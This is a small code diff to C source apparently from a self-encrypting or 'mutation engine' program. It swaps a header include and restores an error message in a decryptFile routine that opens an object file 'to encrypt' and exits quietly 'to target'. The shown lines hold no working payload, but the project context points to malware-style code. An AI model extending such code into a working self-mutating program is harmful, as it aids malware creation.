@@ -1,4 +1,4 @@
-#include "start.h"
+#include "mutationEngine.h"
 
 /*********************************************************************************
 * Author: Laine Rumreich								       				 				   *
@@ -20,7 +20,7 @@ void decryptFile(int key) {
 	// Open the file xichigan (.o file) to encrypt
 	xFp = fopen("xichigan","rb+");
 	if (xFp == NULL){
-		//printf("Cannot open file \n");
+		printf("Cannot open file \n");
 		exit(0); // Exit with no error to target
 	}
 
